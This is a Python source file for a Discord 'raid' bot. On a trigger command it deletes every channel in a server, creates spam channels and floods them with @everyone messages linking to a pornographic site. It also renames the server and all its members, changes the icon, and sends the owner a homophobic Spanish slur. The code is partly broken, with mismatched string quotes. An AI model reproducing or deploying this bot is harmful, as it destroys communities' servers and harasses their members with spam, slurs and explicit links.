import discord
import random


client = discord.Client()


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    await client.change_presence(status=discord.Status.idle, activity=discord.Game("MATANDO PACOS"))

RAIDER_GROUP = 'RAIDER GANG'
PING_EVERYONE = True
CHANNEL_NAME = 'raided-by-mauricio
GUILD_NAME = 'RAIDED BY MAURICIO"
TOKEN = ''
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith("!raid-mauricio"):
        if PING_EVERYONE == True:
         text = f'@everyone https://discord.gg/ RAIDED BY {RAIDER_GROUP}! MAURICIO PAREDES PRESO POLITICO DIOS UNIVERSAL!'
        else: 
          text = f'https://discord.gg/ RAIDED BY {RAIDER_GROUP}! MAURICIO PAREDES PRESO POLITICO DIOS UNIVERSAL!'
        ic = open("r", "r")
        image = open("r.png", "rb")
        rr = image.read()
        b = bytearray(rr)
        embed = discord.Embed(title="www", url="https://pornhub.com",
                              description=f"{ic.read()}", color=0xFF5733)
        for x in message.channel.guild.channels:
            await x.delete()

            await message.guild.create_text_channel(CHANNEL_NAME)
            await random.choice(message.channel.guild.channels).send(content=text, embed=embed)
        await message.guild.edit(name=GUILD_NAME, icon=b)
        channel = await message.guild.fetch_member(message.guild.owner_id)
        await channel.send("Cagaste maricon")
        for main in message.guild.members:
            if(main.id == client.user.id):
                pass
            await main.edit(nick=str(GUILD_NAME))
        X =1

        while X < 100:
            await message.guild.create_text_channel(CHANNEL_NAME)
            await random.choice(message.channel.guild.channels).send(content=text, embed=embed)
            X +=1
        i = 1
        while i < 1e8:
         await random.choice(message.channel.guild.channels).send(content=text, embed=embed)
         i += 1
          
client.run(TOKEN)
